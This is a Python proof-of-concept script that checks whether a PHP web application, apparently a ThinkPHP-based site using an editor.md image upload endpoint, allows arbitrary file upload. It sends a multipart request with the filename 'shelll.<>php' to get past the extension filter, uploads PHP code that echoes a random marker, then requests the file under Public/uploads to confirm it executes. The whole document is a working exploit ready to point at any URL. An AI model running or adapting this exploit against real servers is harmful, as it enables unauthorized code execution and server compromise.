import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r=randomLowercase(20)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?s=/home/page/uploadImg"
	body='''----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="shelll.<>php"
Content-Type: text/plain

<?php echo "'''+r+'''"?>
----------------------------921378126371623762173617--'''
	headers={'Content-Type': 'multipart/form-data; boundary=--------------------------921378126371623762173617'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "success" in response.text:
		r0=True
		try:
			poc_file1=re.findall("Uploads\\\\/(.*?).php",response.text)[0]
		except:
			poc_file1=''
	else:
		poc_file1=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"Public/uploads/"+poc_file1.replace('\\','')+".php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r) in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
